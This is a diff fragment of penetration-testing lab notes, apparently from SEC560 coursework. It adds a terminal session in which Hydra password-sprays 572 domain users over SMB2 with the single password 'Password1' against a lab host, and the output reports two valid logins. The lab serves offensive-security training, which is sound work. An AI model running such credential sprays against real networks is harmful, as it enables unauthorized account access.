@@ -3230,3 +3230,26 @@ HealthMailboxa19fe48
 HealthMailboxfc7db9c
 sec560@560vm:~/Downloads$ 
 ```
+
+```
+sec560@560vm:~/Downloads$ hydra -L domainusers.txt -p Password1 -m workgroup:{hiboxy} 10.130.10.4 smb2
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:36:06
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 572 login tries (l:572/p:1), ~36 tries per task
+[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: bgreen   password: Password1
+[WARNING] 10.130.10.4 might accept any credential
+[445][smb2] host: 10.130.10.4   login: jcooper   password: Password1
+[STATUS] 560.00 tries/min, 560 tries in 00:01h, 12 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:37:08
+sec560@560vm:~/Downloads$
+```
+
+## Lab 2.3: Azure Recon and Password Attacks
+
+### Linux
+
+
